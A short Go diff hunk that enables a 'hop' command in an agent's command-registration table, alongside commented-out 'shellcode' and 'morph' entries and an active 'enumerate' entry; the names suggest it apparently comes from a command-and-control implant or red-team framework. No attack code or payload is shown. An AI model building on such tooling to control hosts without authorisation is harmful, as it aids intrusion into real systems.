@@ -58,7 +58,7 @@ func registerCommands(agent *Agent) {
 	//agent.commandOrchestrators["shellcode"] = (*Agent).orchestrateShellcode
 	agent.commandOrchestrators["enumerate"] = (*Agent).orchestrateEnumerate
 	//agent.commandOrchestrators["morph"] = (*Agent).orchestrateMorph
-	//agent.commandOrchestrators["hop"] = (*Agent).orchestrateHop
+	agent.commandOrchestrators["hop"] = (*Agent).orchestrateHop
 
 }
 
